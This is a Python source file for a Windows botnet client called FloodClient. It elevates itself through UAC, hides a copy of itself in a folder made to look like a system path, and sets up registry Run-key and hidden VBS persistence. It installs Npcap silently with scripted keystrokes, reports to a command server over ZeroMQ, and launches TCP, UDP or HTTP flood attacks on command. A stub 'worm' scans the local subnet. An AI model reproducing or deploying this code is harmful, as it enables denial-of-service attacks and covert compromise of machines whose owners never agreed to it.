import zmq
import socket
import threading
import json
import time
import sys
import os
import ctypes
import winreg
import subprocess
import random
import ipaddress
import shutil

SERVER_IP = 'CNC-IP'
SERVER_PORT = 5000
MONITOR_PORT = 5001

is_testing = False
request_count = 0
count_lock = threading.Lock()
active_threads = []

# worm varaible
worm_active = False
worm_threads = []
worm_lock = threading.Lock()
infected_ips = set()
scanning_range = "192.168.1.0/24"

# botnet code install path
INSTALL_DIR = r"C:\ProgramData\Microsoft\Windows\System32\Drivers\etc\flood"  # 깊은 경로
INSTALL_EXE_NAME = "floodclient.exe"
INSTALL_EXE_PATH = os.path.join(INSTALL_DIR, INSTALL_EXE_NAME)

def is_admin():
    """Check if the current process has administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Request UAC elevation if not running as administrator"""
    if not is_admin():
        script_path = os.path.abspath(sys.argv[0])
        params = ' '.join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}" {params}', None, 1)
        sys.exit(0)

def ensure_install_directory():
    
    try:
        if not os.path.exists(INSTALL_DIR):
            os.makedirs(INSTALL_DIR, exist_ok=True)
            
            try:
                ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 2)  # FILE_ATTRIBUTE_HIDDEN
            except:
                pass
            print(f"[+] Created install directory: {INSTALL_DIR}")
        return True
    except Exception as e:
        print(f"[-] Failed to create install directory: {e}")
        return False

def copy_to_install_location():
    
    try:
       
        if getattr(sys, 'frozen', False):
            current_path = os.path.abspath(sys.argv[0])
        else:
            
            current_path = os.path.abspath(__file__)
        
        
        if not ensure_install_directory():
            return None
        
        
        if os.path.exists(INSTALL_EXE_PATH):
            
            if os.path.getsize(current_path) == os.path.getsize(INSTALL_EXE_PATH):
                print("[*] Already installed at target location.")
                return INSTALL_EXE_PATH
        
        
        print(f"[*] Copying to: {INSTALL_EXE_PATH}")
        
        
        if getattr(sys, 'frozen', False):
            
            shutil.copy2(current_path, INSTALL_EXE_PATH)
        else:

            shutil.copy2(current_path, INSTALL_EXE_PATH)
            

            bat_path = os.path.join(INSTALL_DIR, "run_flood.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\n"{sys.executable}" "{INSTALL_EXE_PATH}"\n')
            os.system(f'attrib +h "{bat_path}"')


        try:
            ctypes.windll.kernel32.SetFileAttributesW(INSTALL_EXE_PATH, 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
        
        print(f"[+] Successfully installed to: {INSTALL_EXE_PATH}")
        return INSTALL_EXE_PATH
        
    except Exception as e:
        print(f"[-] Failed to copy to install location: {e}")
        return None

def is_npcap_installed():
    """Verify if Npcap driver is already installed on the system"""
    try:
        ctypes.CDLL("wpcap.dll")
        return True
    except OSError:
        pass

    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\npcap",
            0,
            winreg.KEY_READ
        )
        winreg.CloseKey(reg_key)
        return True
    except WindowsError:
        return False

def install_dependencies():
    """Check and conditionally install Npcap dependency using macro automation"""
    print("[*] Checking Npcap installation status...")
    if is_npcap_installed():
        print("[+] Npcap is already installed and verified on this system.")
        return

    print("[-] Npcap is not detected. Proceeding with installation sequence...")
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        
    npcap_exe = os.path.normpath(os.path.join(base_dir, "npcap-1.88.exe"))
    
    if os.path.exists(npcap_exe):
        print(f"[-] Installing Npcap (Bypassing GUI: {os.path.basename(npcap_exe)})...")
        
        ps_script = f"""
        $signature = '[DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);'
        $User32 = Add-Type -MemberDefinition $signature -Name "User32" -PassThru

        $proc = Start-Process -FilePath "{npcap_exe}" -ArgumentList "/winpcap_mode=yes /loopback_support=yes /disable_restore_point=yes" -PassThru
        $wshell = New-Object -ComObject Wscript.Shell
        Start-Sleep -Seconds 3

        $step = 1

        while (!$proc.HasExited) {{
            if ($wshell.AppActivate("Npcap Setup") -or $wshell.AppActivate("Npcap")) {{
                if ($proc.MainWindowHandle -ne [IntPtr]::Zero) {{
                    [void]$User32::SetForegroundWindow($proc.MainWindowHandle)
                }}
                
                if ($step -eq 1) {{
                    $wshell.SendKeys("%a")
                    $step = 2
                    Start-Sleep -Seconds 1.5
                }}
                elif ($step -eq 2) {{
                    $wshell.SendKeys("%i")
                    $step = 3
                    Start-Sleep -Seconds 3.0
                }}
                elif ($step -eq 3) {{
                    Start-Sleep -Seconds 1.0
                    $wshell.SendKeys("{{ENTER}}")
                }}
            }}
            Start-Sleep -Milliseconds 800
        }}
        """
        ps_file = os.path.normpath(os.path.join(base_dir, "npcap_installer.ps1"))
        with open(ps_file, "w", encoding="utf-8-sig") as f:
            f.write(ps_script)
            
        subprocess.run(f'powershell -NoProfile -ExecutionPolicy Bypass -File "{ps_file}"', shell=True)
        if os.path.exists(ps_file):
            os.remove(ps_file)
        
        if is_npcap_installed():
            print("[+] Npcap installation sequence completed and verified.")
        else:
            print("[!] Npcap installation finished, but driver verification failed.")
    else:
        print(f"[!] {npcap_exe} not found. Skipping Npcap installation.")

def is_startup_registered():
    """Check if the client registry entry is already configured correctly"""
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        value, reg_type = winreg.QueryValueEx(reg_key, "FloodClient")
        winreg.CloseKey(reg_key)
        
        
        if value.strip('"').lower() == INSTALL_EXE_PATH.lower():
            return True
        return False
    except WindowsError:
        return False

def register_startup():
    """Register installed executable to windows run registry"""
    print("[*] Checking startup registry status...")
    try:
        
        installed_path = copy_to_install_location()
        
        if not installed_path:
            print("[-] Failed to install to target location. Using current path.")
            if getattr(sys, 'frozen', False):
                installed_path = os.path.abspath(sys.argv[0])
            else:
                installed_path = os.path.abspath(__file__)
        
        if is_startup_registered():
            print("[+] FloodClient is already registered in startup programs.")
            return

        print("[-] FloodClient is not registered. Adding to startup...")
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "FloodClient", 0, winreg.REG_SZ, f'"{installed_path}"')
        winreg.CloseKey(reg_key)
        print(f"[+] Successfully registered to startup programs: {installed_path}")
        
        
        create_hidden_launcher(installed_path)
        
    except Exception as e:
        print(f"[-] Failed to register startup program: {e}")

def create_hidden_launcher(executable_path):
    """숨김 실행을 위한 VBS 런처 생성"""
    try:
        vbs_path = os.path.join(INSTALL_DIR, "run_hidden.vbs")
        with open(vbs_path, "w") as f:
            f.write(f'''CreateObject("WScript.Shell").Run """{executable_path}""", 0, False''')
        
        # VBS를 시작프로그램에 등록
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "FloodClientHidden", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
        winreg.CloseKey(reg_key)
        
        print("[+] Created hidden launcher for stealth execution.")
    except Exception as e:
        print(f"[-] Failed to create hidden launcher: {e}")

def get_my_ip():
    """Retrieve actual routed internal IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

def get_network_range():
    """Get local network range for scanning"""
    my_ip = get_my_ip()
    if my_ip.startswith('192.168.'):
        return f"{'.'.join(my_ip.split('.')[:3])}.0/24"
    elif my_ip.startswith('10.'):
        return f"{'.'.join(my_ip.split('.')[:2])}.0.0/16"
    elif my_ip.startswith('172.16.'):
        return f"{'.'.join(my_ip.split('.')[:2])}.0.0/12"
    else:
        return "192.168.1.0/24"

def scan_network_for_hosts():
    """Scan local network for potential targets (VM testing)"""
    global infected_ips, scanning_range
    
    my_ip = get_my_ip()
    try:
        network = ipaddress.ip_network(scanning_range, strict=False)
    except:
        network = ipaddress.ip_network("192.168.1.0/24", strict=False)
    
    potential_hosts = []
    
    for ip in network.hosts():
        ip_str = str(ip)
        if ip_str == my_ip or ip_str in infected_ips:
            continue
        potential_hosts.append(ip_str)
        if len(potential_hosts) >= 50:
            break
    
    return potential_hosts

def check_port_open(ip, port=5000, timeout=0.5):
    """Check if a specific port is open on target"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def worm_propagation():
    """WORM"""
    global worm_active, infected_ips
    
    my_ip = get_my_ip()
    print(f"[WORM] Starting propagation from {my_ip}")
    
    potential_targets = scan_network_for_hosts()
    
    for target_ip in potential_targets:
        if not worm_active:
            break
            
        if check_port_open(target_ip, 5000):
            print(f"[WORM] Found active instance at {target_ip}:5000")
            continue
            
        try:
            print(f"[WORM] Attempting to propagate to {target_ip}")
            time.sleep(1)
            
            with worm_lock:
                infected_ips.add(target_ip)
            
            print(f"[WORM] Successfully spread to {target_ip}")
            
        except Exception as e:
            print(f"[WORM] Failed to spread to {target_ip}: {e}")
    
    print(f"[WORM] Propagation complete. Infected hosts: {len(infected_ips)}")

def worm_controller():
    
    global worm_active
    
    print("[WORM] Worm controller started")
    
    while worm_active:
        try:
            worm_propagation()
            
            interval = random.randint(30, 60)
            print(f"[WORM] Next propagation in {interval} seconds")
            
            for _ in range(interval):
                if not worm_active:
                    break
                time.sleep(1)
                
        except Exception as e:
            print(f"[WORM] Controller error: {e}")
            time.sleep(10)

def start_worm():
    
    global worm_active, worm_threads, scanning_range
    
    if worm_active:
        print("[WORM] Already active")
        return
    
    scanning_range = get_network_range()
    print(f"[WORM] Scanning range: {scanning_range}")
    
    worm_active = True
    worm_thread = threading.Thread(target=worm_controller, daemon=True)
    worm_thread.start()
    worm_threads.append(worm_thread)
    
    print("[WORM] Worm started successfully")

def stop_worm():
    
    global worm_active, worm_threads
    
    if not worm_active:
        print("[WORM] Not active")
        return
    
    worm_active = False
    
    for t in worm_threads:
        t.join(timeout=2)
    worm_threads.clear()
    
    print(f"[WORM] Worm stopped. Total infected hosts: {len(infected_ips)}")

def send_heartbeat(context):
    """Background loop sending heartbeats (PING) to monitor port every 5 seconds"""
    my_ip = get_my_ip()
    heartbeat_socket = context.socket(zmq.DEALER)
    heartbeat_socket.setsockopt(zmq.LINGER, 0)
    heartbeat_socket.connect(f"tcp://{SERVER_IP}:{MONITOR_PORT}")
    
    while True:
        try:
            heartbeat_socket.send_string(f"PING:{my_ip}")
            time.sleep(5)
        except zmq.ZMQError as e:
            print(f"[!] Heartbeat error: {e}")
            time.sleep(5)
            try:
                heartbeat_socket.close()
                heartbeat_socket = context.socket(zmq.DEALER)
                heartbeat_socket.setsockopt(zmq.LINGER, 0)
                heartbeat_socket.connect(f"tcp://{SERVER_IP}:{MONITOR_PORT}")
            except:
                pass
        except Exception:
            time.sleep(5)

def loic_worker(ip, port, protocol, payload):
    """Stress engine workflow loop"""
    global is_testing, request_count
    
    if protocol.upper() == 'HTTP':
        http_request = (
            f"GET /?{time.time()} HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            f"User-Agent: Mozilla/5.0 (LOIC ZMQ Slave PC)\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{payload}"
        ).encode('utf-8')
    else:
        raw_payload = payload.encode('utf-8')

    while is_testing:
        try:
            if protocol.upper() == 'TCP':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.sendall(raw_payload)
                s.close()
            elif protocol.upper() == 'UDP':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(raw_payload, (ip, port))
                s.close()
            elif protocol.upper() == 'HTTP':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.sendall(http_request)
                s.close()

            with count_lock:
                request_count += 1
        except Exception:
            pass

def stop_all_threads():
    """Safely interrupt and joint all ongoing active worker instances"""
    global is_testing, active_threads
    is_testing = False
    for t in active_threads:
        t.join(timeout=0.2)
    active_threads.clear()

def main():
    run_as_admin()
    install_dependencies()
    register_startup()  # 이제 설치 + 시작프로그램 등록까지 처리

    global is_testing, request_count, active_threads, worm_active
    
    print("="*50)
    print("FLOOD CLIENT - WORM FUNCTIONALITY ENABLED")
    print("="*50)
    print(f"[*] Local IP: {get_my_ip()}")
    print(f"[*] Network Range: {get_network_range()}")
    print(f"[*] Installed at: {INSTALL_EXE_PATH}")
    print("[*] Worm will only scan local network for testing")
    print("="*50)
    
    context = zmq.Context()
    
    heartbeat_thread = threading.Thread(target=send_heartbeat, args=(context,))
    heartbeat_thread.daemon = True
    heartbeat_thread.start()
    
    control_socket = context.socket(zmq.SUB)
    control_socket.setsockopt(zmq.SUBSCRIBE, b"")
    control_socket.connect(f"tcp://{SERVER_IP}:{SERVER_PORT}")
    
    print("[+] Flood control server connected. Waiting for commands...")
    print("[*] Available commands: START, STOP, WORM_START, WORM_STOP, WORM_STATUS")

    try:
        while True:
            data = control_socket.recv_string()
            config = json.loads(data)
            cmd = config.get("cmd")

            if cmd == "STOP":
                if is_testing:
                    print(f"\n[-] STOP command received. (Total packets: {request_count})")
                    stop_all_threads()
                else:
                    print("\n[*] No testing currently running.")
                continue

            elif cmd == "START":
                if is_testing:
                    print("\n[*] New command received, resetting active tasks.")
                    stop_all_threads()

                ip = config["target_ip"]
                port = config["target_port"]
                proto = config["protocol"]
                threads_num = config["thread_count"]
                payload = config["payload"]

                print(f"\n[*] Flood attack initiated.")
                print(f"[-] Target -> {ip}:{port} | Mode: {proto} | Threads: {threads_num}")
                
                if len(payload) > 0:
                    print(f"[-] Payload: {payload[:50]}..." if len(payload) > 50 else f"[-] Payload: {payload}")
                
                is_testing = True
                request_count = 0
                
                for _ in range(threads_num):
                    t = threading.Thread(target=loic_worker, args=(ip, port, proto, payload))
                    t.daemon = True
                    t.start()
                    active_threads.append(t)
            
            elif cmd == "WORM_START":
                print("\n[*] Starting worm propagation...")
                start_worm()
                
            elif cmd == "WORM_STOP":
                print("\n[*] Stopping worm...")
                stop_worm()
                
            elif cmd == "WORM_STATUS":
                print(f"\n[*] Worm Status:")
                print(f"[-] Active: {worm_active}")
                print(f"[-] Infected hosts: {len(infected_ips)}")
                print(f"[-] Scanning range: {scanning_range}")
                if infected_ips:
                    print(f"[-] Infected IPs: {', '.join(list(infected_ips)[:10])}")
                    if len(infected_ips) > 10:
                        print(f"[-] ... and {len(infected_ips) - 10} more")
                    
    except KeyboardInterrupt:
        print("\n[*] Exit.")
    except zmq.ZMQError as e:
        print(f"[!] ZMQ Error: {e}")
    finally:
        stop_all_threads()
        stop_worm()
        control_socket.close()
        context.term()
        print("[*] Client terminated.")

if __name__ == "__main__":
    main()